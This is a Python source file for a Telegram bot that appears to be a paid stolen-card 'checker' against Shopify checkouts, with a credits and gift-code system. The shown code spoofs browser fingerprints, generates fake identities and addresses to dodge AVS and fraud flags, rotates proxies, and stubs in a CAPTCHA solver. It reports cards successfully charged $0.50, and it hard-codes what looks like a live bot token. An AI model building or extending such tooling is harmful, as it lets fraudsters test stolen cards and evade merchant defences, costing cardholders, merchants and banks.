import re
import json
import requests
from fake_useragent import UserAgent
import time
import random
import telebot
import string
import io
import sys
import logging
import os
import subprocess
from datetime import datetime
import hashlib
import threading  # New import
import math       # New import
from faker import Faker  # NEW: Faker for randomized data
import uuid  # NEW: For generating unique identifiers

BOT_TOKEN = '8200762474:AAHWffqjDuahGqy9UFMfYI8OsnkR1USYQEE'
ADMIN_CHAT_ID = 8079395886

logging.getLogger('telebot').setLevel(logging.CRITICAL)
logging.basicConfig(level=logging.CRITICAL)

bot = telebot.TeleBot(BOT_TOKEN, num_threads=10)

proxy_list = []

# ============================================================================
# NEW: COMPREHENSIVE BROWSER FINGERPRINT DATABASE
# ============================================================================

# Different browser user agents for various browsers and operating systems
BROWSER_USER_AGENTS = {
    'chrome_windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ],
    'chrome_mac': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    ],
    'chrome_linux': [
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ],
    'firefox_windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    ],
    'firefox_mac': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.0; rv:121.0) Gecko/20100101 Firefox/121.0',
    ],
    'firefox_linux': [
        'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    ],
    'safari_mac': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
    ],
    'safari_ios': [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    ],
    'edge_windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    ],
    'edge_mac': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    ],
    'opera_windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0',
    ],
    'opera_mac': [
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    ],
    'brave_windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/120',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Brave/119',
    ],
    'vivaldi_windows': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5',
    ],
    'chrome_android': [
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
    ],
}

# ============================================================================
# NEW: GEOGRAPHIC LOCATION DATABASE WITH MATCHING HEADERS
# ============================================================================

GEOGRAPHIC_LOCATIONS = [
    {
        'country': 'US',
        'city': 'New York',
        'timezone': 'America/New_York',
        'accept_language': 'en-US,en;q=0.9',
        'locale': 'en_US',
        'currency': 'USD',
        'faker_locale': 'en_US',
    },
    {
        'country': 'US',
        'city': 'Los Angeles',
        'timezone': 'America/Los_Angeles',
        'accept_language': 'en-US,en;q=0.9',
        'locale': 'en_US',
        'currency': 'USD',
        'faker_locale': 'en_US',
    },
    {
        'country': 'US',
        'city': 'Chicago',
        'timezone': 'America/Chicago',
        'accept_language': 'en-US,en;q=0.9',
        'locale': 'en_US',
        'currency': 'USD',
        'faker_locale': 'en_US',
    },
    {
        'country': 'US',
        'city': 'Houston',
        'timezone': 'America/Chicago',
        'accept_language': 'en-US,en;q=0.9',
        'locale': 'en_US',
        'currency': 'USD',
        'faker_locale': 'en_US',
    },
    {
        'country': 'US',
        'city': 'Phoenix',
        'timezone': 'America/Phoenix',
        'accept_language': 'en-US,en;q=0.9',
        'locale': 'en_US',
        'currency': 'USD',
        'faker_locale': 'en_US',
    },
    {
        'country': 'UK',
        'city': 'London',
        'timezone': 'Europe/London',
        'accept_language': 'en-GB,en;q=0.9',
        'locale': 'en_GB',
        'currency': 'GBP',
        'faker_locale': 'en_GB',
    },
    {
        'country': 'UK',
        'city': 'Manchester',
        'timezone': 'Europe/London',
        'accept_language': 'en-GB,en;q=0.9',
        'locale': 'en_GB',
        'currency': 'GBP',
        'faker_locale': 'en_GB',
    },
    {
        'country': 'CA',
        'city': 'Toronto',
        'timezone': 'America/Toronto',
        'accept_language': 'en-CA,en;q=0.9,fr-CA;q=0.8',
        'locale': 'en_CA',
        'currency': 'CAD',
        'faker_locale': 'en_CA',
    },
    {
        'country': 'CA',
        'city': 'Vancouver',
        'timezone': 'America/Vancouver',
        'accept_language': 'en-CA,en;q=0.9',
        'locale': 'en_CA',
        'currency': 'CAD',
        'faker_locale': 'en_CA',
    },
    {
        'country': 'AU',
        'city': 'Sydney',
        'timezone': 'Australia/Sydney',
        'accept_language': 'en-AU,en;q=0.9',
        'locale': 'en_AU',
        'currency': 'AUD',
        'faker_locale': 'en_AU',
    },
    {
        'country': 'AU',
        'city': 'Melbourne',
        'timezone': 'Australia/Melbourne',
        'accept_language': 'en-AU,en;q=0.9',
        'locale': 'en_AU',
        'currency': 'AUD',
        'faker_locale': 'en_AU',
    },
    {
        'country': 'DE',
        'city': 'Berlin',
        'timezone': 'Europe/Berlin',
        'accept_language': 'de-DE,de;q=0.9,en;q=0.8',
        'locale': 'de_DE',
        'currency': 'EUR',
        'faker_locale': 'de_DE',
    },
    {
        'country': 'FR',
        'city': 'Paris',
        'timezone': 'Europe/Paris',
        'accept_language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'locale': 'fr_FR',
        'currency': 'EUR',
        'faker_locale': 'fr_FR',
    },
    {
        'country': 'NL',
        'city': 'Amsterdam',
        'timezone': 'Europe/Amsterdam',
        'accept_language': 'nl-NL,nl;q=0.9,en;q=0.8',
        'locale': 'nl_NL',
        'currency': 'EUR',
        'faker_locale': 'nl_NL',
    },
    {
        'country': 'ES',
        'city': 'Madrid',
        'timezone': 'Europe/Madrid',
        'accept_language': 'es-ES,es;q=0.9,en;q=0.8',
        'locale': 'es_ES',
        'currency': 'EUR',
        'faker_locale': 'es_ES',
    },
    {
        'country': 'IT',
        'city': 'Rome',
        'timezone': 'Europe/Rome',
        'accept_language': 'it-IT,it;q=0.9,en;q=0.8',
        'locale': 'it_IT',
        'currency': 'EUR',
        'faker_locale': 'it_IT',
    },
    {
        'country': 'JP',
        'city': 'Tokyo',
        'timezone': 'Asia/Tokyo',
        'accept_language': 'ja-JP,ja;q=0.9,en;q=0.8',
        'locale': 'ja_JP',
        'currency': 'JPY',
        'faker_locale': 'ja_JP',
    },
    {
        'country': 'SG',
        'city': 'Singapore',
        'timezone': 'Asia/Singapore',
        'accept_language': 'en-SG,en;q=0.9,zh;q=0.8',
        'locale': 'en_SG',
        'currency': 'SGD',
        'faker_locale': 'en_US',
    },
    {
        'country': 'NZ',
        'city': 'Auckland',
        'timezone': 'Pacific/Auckland',
        'accept_language': 'en-NZ,en;q=0.9',
        'locale': 'en_NZ',
        'currency': 'NZD',
        'faker_locale': 'en_NZ',
    },
    {
        'country': 'IE',
        'city': 'Dublin',
        'timezone': 'Europe/Dublin',
        'accept_language': 'en-IE,en;q=0.9',
        'locale': 'en_IE',
        'currency': 'EUR',
        'faker_locale': 'en_IE',
    },
]

# ============================================================================
# NEW: BROWSER FINGERPRINT CLASS
# ============================================================================

class BrowserFingerprint:
    """Generates consistent browser fingerprints for each request"""
    
    def __init__(self):
        self.reset()
    
    def reset(self):
        """Generate a new random fingerprint"""
        # Select random browser type
        browser_types = list(BROWSER_USER_AGENTS.keys())
        self.browser_type = random.choice(browser_types)
        self.user_agent = random.choice(BROWSER_USER_AGENTS[self.browser_type])
        
        # Select random location
        self.location = random.choice(GEOGRAPHIC_LOCATIONS)
        
        # Initialize Faker with location-specific locale
        try:
            self.faker = Faker(self.location['faker_locale'])
        except:
            self.faker = Faker('en_US')
        
        # Generate unique session identifiers
        self.session_id = str(uuid.uuid4())
        self.client_id = hashlib.md5(f"{time.time()}{random.randint(1, 999999)}".encode()).hexdigest()
        
        # Screen resolutions based on device type
        if 'mobile' in self.browser_type.lower() or 'ios' in self.browser_type.lower() or 'android' in self.browser_type.lower():
            self.screen_resolutions = ['375x812', '390x844', '414x896', '360x780', '412x915']
        else:
            self.screen_resolutions = ['1920x1080', '2560x1440', '1366x768', '1536x864', '1440x900', '1680x1050', '2560x1600']
        
        self.screen_resolution = random.choice(self.screen_resolutions)
        self.color_depth = random.choice([24, 32])
        self.pixel_ratio = random.choice([1, 1.25, 1.5, 2, 2.5, 3])
        
        # Platform based on user agent
        if 'Windows' in self.user_agent:
            self.platform = 'Win32'
            self.os_name = 'Windows'
        elif 'Macintosh' in self.user_agent or 'Mac OS' in self.user_agent:
            self.platform = 'MacIntel'
            self.os_name = 'macOS'
        elif 'Linux' in self.user_agent and 'Android' not in self.user_agent:
            self.platform = 'Linux x86_64'
            self.os_name = 'Linux'
        elif 'Android' in self.user_agent:
            self.platform = 'Linux armv8l'
            self.os_name = 'Android'
        elif 'iPhone' in self.user_agent or 'iPad' in self.user_agent:
            self.platform = 'iPhone'
            self.os_name = 'iOS'
        else:
            self.platform = 'Win32'
            self.os_name = 'Windows'
    
    def get_sec_ch_ua(self):
        """Generate Sec-CH-UA header based on browser type"""
        if 'chrome' in self.browser_type.lower():
            version = re.search(r'Chrome/(\d+)', self.user_agent)
            ver = version.group(1) if version else '120'
            return f'"Not_A Brand";v="8", "Chromium";v="{ver}", "Google Chrome";v="{ver}"'
        elif 'edge' in self.browser_type.lower():
            version = re.search(r'Edg/(\d+)', self.user_agent)
            ver = version.group(1) if version else '120'
            return f'"Not_A Brand";v="8", "Chromium";v="{ver}", "Microsoft Edge";v="{ver}"'
        elif 'opera' in self.browser_type.lower():
            return '"Not_A Brand";v="8", "Chromium";v="120", "Opera";v="106"'
        elif 'brave' in self.browser_type.lower():
            return '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"'
        else:
            return None
    
    def get_headers(self, authority=None, origin=None, referer=None):
        """Generate complete headers with fingerprint"""
        headers = {
            'user-agent': self.user_agent,
            'accept-language': self.location['accept_language'],
            'accept-encoding': 'gzip, deflate, br',
            'dnt': '1',  # Do Not Track
            'sec-gpc': '1',  # Global Privacy Control
            'cache-control': 'no-cache, no-store, must-revalidate',
            'pragma': 'no-cache',
            'expires': '0',
        }
        
        # Add Sec-CH-UA headers for Chromium-based browsers
        sec_ch_ua = self.get_sec_ch_ua()
        if sec_ch_ua:
            headers['sec-ch-ua'] = sec_ch_ua
            headers['sec-ch-ua-mobile'] = '?1' if 'mobile' in self.browser_type.lower() or 'android' in self.browser_type.lower() or 'ios' in self.browser_type.lower() else '?0'
            headers['sec-ch-ua-platform'] = f'"{self.os_name}"'
        
        if authority:
            headers['authority'] = authority
        if origin:
            headers['origin'] = origin
        if referer:
            headers['referer'] = referer
        
        return headers
    
    def get_random_identity(self):
        """Generate random identity using Faker"""
        return {
            'first_name': self.faker.first_name(),
            'last_name': self.faker.last_name(),
            'email': self.faker.email(),
            'phone': self.faker.phone_number(),
            'address1': self.faker.street_address(),
            'address2': '',
            'city': self.faker.city(),
            'state': self.faker.state_abbr() if hasattr(self.faker, 'state_abbr') else self.faker.city(),
            'postal_code': self.faker.postcode(),
            'country': self.location['country'],
        }

# ============================================================================
# NEW: ANTI-TRACKING SESSION CLASS
# ============================================================================

class AntiTrackingSession:
    """Session wrapper that prevents tracking and auto-clears cache"""
    
    def __init__(self, fingerprint=None, proxy=None):
        self.fingerprint = fingerprint or BrowserFingerprint()
        self.proxy = proxy
        self._create_session()
    
    def _create_session(self):
        """Create a new clean session"""
        self.session = requests.Session()
        
        # Disable cookies persistence
        self.session.cookies.clear()
        
        # Set proxy if provided
        if self.proxy:
            self.session.proxies.update(self.proxy)
        
        # Set default headers to prevent tracking
        self.session.headers.update({
            'DNT': '1',
            'Sec-GPC': '1',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
        })
    
    def clear_cache(self):
        """Clear all session data"""
        self.session.cookies.clear()
        self.session.cache = None if hasattr(self.session, 'cache') else None
    
    def reset(self):
        """Completely reset the session with new fingerprint"""
        self.clear_cache()
        self.fingerprint.reset()
        self._create_session()
    
    def get(self, url, **kwargs):
        """GET request with anti-tracking headers"""
        headers = kwargs.pop('headers', {})
        merged_headers = self.fingerprint.get_headers()
        merged_headers.update(headers)
        
        # Add cache-busting query parameter
        if '?' in url:
            url += f'&_={int(time.time() * 1000)}'
        else:
            url += f'?_={int(time.time() * 1000)}'
        
        response = self.session.get(url, headers=merged_headers, **kwargs)
        
        # Clear tracking cookies after request
        self._clear_tracking_cookies()
        
        return response
    
    def post(self, url, **kwargs):
        """POST request with anti-tracking headers"""
        headers = kwargs.pop('headers', {})
        merged_headers = self.fingerprint.get_headers()
        merged_headers.update(headers)
        
        response = self.session.post(url, headers=merged_headers, **kwargs)
        
        # Clear tracking cookies after request
        self._clear_tracking_cookies()
        
        return response
    
    def _clear_tracking_cookies(self):
        """Remove known tracking cookies"""
        tracking_cookies = [
            '_ga', '_gid', '_gat', '__utma', '__utmb', '__utmc', '__utmz',
            '_fbp', '_fbc', 'fr', 'tr',
            '_shopify_s', '_shopify_y', '_y', '_s',
            'cart_sig', 'cart_ts', 'cart_ver',
            '_tracking_consent', '_shopify_sa_t', '_shopify_sa_p',
            '_orig_referrer', '_landing_page',
            'secure_customer_sig', 'storefront_digest',
        ]
        
        for cookie_name in tracking_cookies:
            try:
                self.session.cookies.pop(cookie_name, None)
            except:
                pass

# ============================================================================
# NEW: FAKER-BASED DATA GENERATORS
# ============================================================================

def get_faker_instance(locale='en_US'):
    """Get a Faker instance with specified locale"""
    try:
        return Faker(locale)
    except:
        return Faker('en_US')

def generate_random_email_faker(faker_instance=None):
    """Generate random email using Faker"""
    if faker_instance:
        return faker_instance.email()
    
    # Fallback to custom generation
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com', 'icloud.com']
    name_part = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
    number_part = str(random.randint(1, 999))
    return f"{name_part}{number_part}@{random.choice(domains)}"

def generate_random_phone_faker(faker_instance=None, country='US'):
    """Generate random phone number using Faker"""
    if faker_instance:
        return faker_instance.phone_number()
    
    # Fallback US phone
    area_codes = ['201', '212', '213', '310', '312', '404', '415', '512', '602', '702', '713', '718', '786', '818', '917']
    return f"+1{random.choice(area_codes)}{random.randint(1000000, 9999999)}"

def generate_random_address_faker(faker_instance=None, location=None):
    """Generate random address using Faker"""
    if faker_instance and location:
        return {
            'address1': faker_instance.street_address(),
            'address2': '',
            'city': faker_instance.city(),
            'countryCode': location['country'],
            'postalCode': faker_instance.postcode(),
            'zoneCode': faker_instance.state_abbr() if hasattr(faker_instance, 'state_abbr') else '',
            'lastName': faker_instance.last_name(),
            'firstName': faker_instance.first_name(),
        }
    
    # Fallback to static addresses
    return random.choice(us_addresses)

def generate_random_name_faker(faker_instance=None):
    """Generate random name using Faker"""
    if faker_instance:
        return faker_instance.first_name(), faker_instance.last_name()
    return random.choice(first_names), random.choice(last_names)

def get_anti_tracking_headers(fingerprint, authority, referer=None, extra_headers=None):
    """Generate headers with anti-tracking and cache prevention"""
    headers = {
        'authority': authority,
        'accept': '*/*',
        'accept-language': fingerprint.location['accept_language'],
        'accept-encoding': 'gzip, deflate, br',
        'user-agent': fingerprint.user_agent,
        'dnt': '1',
        'sec-gpc': '1',
        'cache-control': 'no-cache, no-store, must-revalidate',
        'pragma': 'no-cache',
        'expires': '0',
    }
    
    # Add Sec-CH-UA headers for Chromium browsers
    sec_ch_ua = fingerprint.get_sec_ch_ua()
    if sec_ch_ua:
        headers['sec-ch-ua'] = sec_ch_ua
        headers['sec-ch-ua-mobile'] = '?0'
        headers['sec-ch-ua-platform'] = f'"{fingerprint.os_name}"'
    
    if referer:
        headers['referer'] = referer
    
    if extra_headers:
        headers.update(extra_headers)
    
    return headers


# JSON Database file
DATA_FILE = 'checker_data.json'

# Initialize JSON database
def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {'users': {}, 'gift_codes': {}}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# User management functions
def get_user_credits(user_id):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        return data['users'][user_id_str].get('credits', 0)
    return 0

def add_user(user_id, username):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str not in data['users']:
        data['users'][user_id_str] = {
            'username': username,
            'credits': 0,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        save_data(data)

def deduct_credit(user_id):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        if data['users'][user_id_str]['credits'] > 0: # Avoid going negative
            data['users'][user_id_str]['credits'] -= 1
            data['users'][user_id_str]['total_checks'] += 1
            save_data(data)

def add_credits(user_id, amount):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data['users']:
        data['users'][user_id_str]['credits'] += amount
    else:
        data['users'][user_id_str] = {
            'username': 'Unknown',
            'credits': amount,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    save_data(data)

def generate_gift_code(credits, admin_id):
    code = hashlib.md5(f"{time.time()}{random.randint(1000, 9999)}".encode()).hexdigest()[:12].upper()
    data = load_data()
    data['gift_codes'][code] = {
        'credits': credits,
        'created_by': admin_id,
        'created_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'is_used': False,
        'redeemed_by': None,
        'redeemed_date': None
    }
    save_data(data)
    return code

def redeem_gift_code(code, user_id):
    data = load_data()
    code = code.upper()
    
    if code not in data['gift_codes']:
        return False, "Invalid gift code"
    
    gift = data['gift_codes'][code]
    
    if gift['is_used']:
        return False, "Gift code already used"
    
    # Mark as used
    data['gift_codes'][code]['is_used'] = True
    data['gift_codes'][code]['redeemed_by'] = user_id
    data['gift_codes'][code]['redeemed_date'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Add credits to user
    credits = gift['credits']
    user_id_str = str(user_id)
    
    # Ensure user exists
    if user_id_str not in data['users']:
        data['users'][user_id_str] = {
            'username': 'Unknown',
            'credits': 0,
            'total_checks': 0,
            'joined_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    
    # Add credits
    data['users'][user_id_str]['credits'] += credits
    
    # Save everything at once
    save_data(data)
    
    return True, credits

# List of random US addresses for anonymity (to avoid AVS/fraud flags)
us_addresses = [
    {"address1": "123 Main St", "address2": "", "city": "New York", "countryCode": "US", "postalCode": "10001", "zoneCode": "NY", "lastName": "Doe", "firstName": "John"},
    {"address1": "456 Oak Ave", "address2": "", "city": "Los Angeles", "countryCode": "US", "postalCode": "90001", "zoneCode": "CA", "lastName": "Smith", "firstName": "Emily"},
    {"address1": "789 Pine Rd", "address2": "", "city": "Chicago", "countryCode": "US", "postalCode": "60601", "zoneCode": "IL", "lastName": "Johnson", "firstName": "Alex"},
    {"address1": "101 Elm St", "address2": "", "city": "Houston", "countryCode": "US", "postalCode": "77001", "zoneCode": "TX", "lastName": "Miller", "firstName": "Nico"},
    {"address1": "202 Maple Dr", "address2": "", "city": "Phoenix", "countryCode": "US", "postalCode": "85001", "zoneCode": "AZ", "lastName": "Brown", "firstName": "Tom"},
    {"address1": "303 Cedar Ln", "address2": "", "city": "Philadelphia", "countryCode": "US", "postalCode": "19101", "zoneCode": "PA", "lastName": "Davis", "firstName": "Sarah"},
    {"address1": "404 Birch Blvd", "address2": "", "city": "San Antonio", "countryCode": "US", "postalCode": "78201", "zoneCode": "TX", "lastName": "Wilson", "firstName": "Liam"},
    {"address1": "505 Walnut St", "address2": "", "city": "San Diego", "countryCode": "US", "postalCode": "92101", "zoneCode": "CA", "lastName": "Moore", "firstName": "Emma"},
    {"address1": "606 Spruce Ave", "address2": "", "city": "Dallas", "countryCode": "US", "postalCode": "75201", "zoneCode": "TX", "lastName": "Taylor", "firstName": "Oliver"},
    {"address1": "707 Ash Rd", "address2": "", "city": "San Jose", "countryCode": "US", "postalCode": "95101", "zoneCode": "CA", "lastName": "Anderson", "firstName": "Ava"},
]

def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""

def get_random_proxy():
    if proxy_list:
        return random.choice(proxy_list)
    return None

first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam", "Emma", "Oliver", "Ava"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore", "Taylor", "Anderson", "Thomas"]

# BIN Lookup function
def get_bin_info(bin_number):
    """Get BIN information from API"""
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            
            # Extract info
            scheme = data.get('scheme', 'UNKNOWN').upper()
            card_type = data.get('type', 'UNKNOWN').upper()
            brand = data.get('brand', 'UNKNOWN').upper()
            bank_name = data.get('bank', {}).get('name', 'UNKNOWN').upper()
            country_name = data.get('country', {}).get('name', 'UNKNOWN').upper()
            country_emoji = data.get('country', {}).get('emoji', '🌍')
            
            return {
                'scheme': scheme,
                'type': card_type,
                'brand': brand,
                'bank': bank_name,
                'country': country_name,
                'emoji': country_emoji
            }
    except:
        pass
    
    # Fallback if API fails
    return {
        'scheme': 'UNKNOWN',
        'type': 'UNKNOWN',
        'brand': 'UNKNOWN',
        'bank': 'UNKNOWN',
        'country': 'UNKNOWN',
        'emoji': '🌍'
    }

def random_delay(min_sec=0.3, max_sec=0.8):
    """Add random delay to mimic human behavior and avoid rate limits."""
    delay = random.uniform(min_sec, max_sec)
    time.sleep(delay)
    print(f"⏳ Random delay: {delay:.2f}s")

def get_random_address():
    """Get a random US address for billing/shipping anonymity."""
    return random.choice(us_addresses)

# --- NEW HELPER FUNCTIONS ---

def create_batches(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def check_card_worker_safe(card_details, username, proxy_to_use, stats_counters, lock, chat_id):
    """
    Worker thread to check a single card and safely update shared lists/dictionaries.
    """
    result_text = ""
    card_status = 'errors' # Default
    try:
        # Call the modified sh function, passing the specific proxy
        result = sh(card_details, username, proxy_to_use=proxy_to_use)

        if isinstance(result, str):
            card_to_display = card_details
            response_msg = f"Error: {result}"
            card_status = 'errors'
        else:
            card_to_display = result['full_card']
            response_msg = result['resp_msg']
            
            # Track results
            if "ORDER_PLACED" in response_msg or "thank" in response_msg.lower():
                card_status = 'charged'
                # Send charged card immediately
                bin_info = result['bin_info']
                response_text = f"""#Shopify_Charge | T R U S T [/sh]
━━━━━━━━━━━━━
[ϟ] Card: {result['full_card']}
[ϟ] Gateway: Shopify 0.50$
[ϟ] Status: Charged ✅
[ϟ] Response: {response_msg}
━━━━━━━━━━━━━
[ϟ] Bin: {result['bin']}
[ϟ] Info: {bin_info['scheme']} - {bin_info['type']} - PERSONAL
[ϟ] Bank: {bin_info['bank']}
[ϟ] Country: {bin_info['country']} - [{bin_info['emoji']}]
━━━━━━━━━━━━━
[ϟ] Checked By: @{result['username']} [ 💎 PREMIUM ]
[⌥] Dev: {result['dev']} - {result['dev_emoji']}
━━━━━━━━━━━━━
[ϟ] Time: [{result['elapsed_time']}]"""
                bot.send_message(chat_id, response_text)
            elif "3D_SECURE" in response_msg:
                card_status = 'auth'
            elif "Declined" in result['status']:
                card_status = 'declined'
            else:
                card_status = 'errors'

    except Exception as e:
        print(f"Error processing card {card_details} in thread: {e}")
        card_status = 'errors'
    
    # Use the lock to safely update the shared stats
    with lock:
        stats_counters[card_status] += 1

# --- CAPTCHA SOLVER PLACEHOLDER ---
def solve_hcaptcha(sitekey, page_url):
    """
    PLACEHOLDER: Integrate your h-captcha solver API here (e.g., 2Captcha, Anti-Captcha).
    
    This function should send the sitekey and page_url to your solver service,
    wait for the solution, and return the h-captcha response token (a long string).
    
    For now, it returns a dummy token. REPLACE THIS LOGIC.
    """
    print(f"⚠️ CAPTCHA required for sitekey: {sitekey} on {page_url}")
    print("⚠️ PLACEHOLDER: Replace this function with your actual h-captcha solver API call.")
    # In a real scenario, you would call your solver API here.
    # Example: token = two_captcha_api.solve(sitekey, page_url)
    time.sleep(5) # Simulate solver delay
    return "hcaptcha_token_placeholder_for_retry" # Must be replaced with a real token

# Common Shopify h-captcha sitekey (may need to be updated for the specific store)
SHOPIFY_HCAPTCHA_SITEKEY = "4c672d35-03a7-4e17-8e66-a43901f0d56c"
